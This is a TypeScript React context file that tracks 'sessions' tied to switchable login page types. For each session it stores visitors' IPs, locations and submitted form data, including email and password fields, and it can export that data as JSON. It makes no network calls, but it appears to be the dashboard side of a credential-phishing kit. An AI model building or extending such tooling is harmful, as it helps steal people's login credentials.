
// Let's assume this file exists already with the basic functionality.
// We'll just update it to include the new session types.

import React, { createContext, useContext, useState, useEffect } from 'react';

interface SessionData {
  timestamp: string;
  ip: string;
  location: string;
  formData: Record<string, string>;
}

interface Session {
  id: string;
  pageType: string;
  createdAt: string;
  data: SessionData[];
  active: boolean; // Added active field to track session status
}

interface SessionContextType {
  sessions: Session[];
  addSession: (pageType: string) => void;
  addSessionData: (sessionId: string, data: SessionData) => void;
  switchPageType: (sessionId: string, newPageType: string) => void;
  exportSessionData: (sessionId: string) => void;
  getSessionById: (sessionId: string) => Session | undefined;
  closeSession: (sessionId: string) => void; // Added closeSession function
}

const SessionContext = createContext<SessionContextType | undefined>(undefined);

export const useSessionContext = (): SessionContextType => {
  const context = useContext(SessionContext);
  if (!context) {
    throw new Error('useSessionContext must be used within a SessionProvider');
  }
  return context;
};

export const SessionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [sessions, setSessions] = useState<Session[]>(() => {
    const savedSessions = localStorage.getItem('sessions');
    return savedSessions ? JSON.parse(savedSessions) : [
      {
        id: 'demo123',
        pageType: 'login1',
        createdAt: new Date().toISOString(),
        data: [
          {
            timestamp: new Date().toISOString(),
            ip: '192.168.1.1',
            location: 'New York, USA',
            formData: { email: 'test@example.com', password: '********' }
          }
        ],
        active: true
      },
      {
        id: 'demo456',
        pageType: 'login2',
        createdAt: new Date().toISOString(),
        data: [],
        active: true
      }
    ];
  });

  useEffect(() => {
    localStorage.setItem('sessions', JSON.stringify(sessions));
  }, [sessions]);

  const generateId = (): string => {
    return Math.random().toString(36).substring(2, 8);
  };

  const addSession = (pageType: string) => {
    const newSession: Session = {
      id: generateId(),
      pageType,
      createdAt: new Date().toISOString(),
      data: [],
      active: true
    };
    setSessions([...sessions, newSession]);
  };

  const addSessionData = (sessionId: string, data: SessionData) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          data: [...session.data, data]
        };
      }
      return session;
    }));
  };

  const switchPageType = (sessionId: string, newPageType: string) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          pageType: newPageType
        };
      }
      return session;
    }));
  };

  const closeSession = (sessionId: string) => {
    setSessions(sessions.map(session => {
      if (session.id === sessionId) {
        return {
          ...session,
          active: false
        };
      }
      return session;
    }));
  };

  const exportSessionData = (sessionId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (!session) return;
    
    const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
      JSON.stringify(session.data, null, 2)
    )}`;
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute('href', dataStr);
    downloadAnchorNode.setAttribute('download', `session_${sessionId}_data.json`);
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const getSessionById = (sessionId: string) => {
    return sessions.find(session => session.id === sessionId);
  };

  return (
    <SessionContext.Provider
      value={{
        sessions: sessions.filter(session => session.active), // Only return active sessions
        addSession,
        addSessionData,
        switchPageType,
        exportSessionData,
        getSessionById,
        closeSession
      }}
    >
      {children}
    </SessionContext.Provider>
  );
};
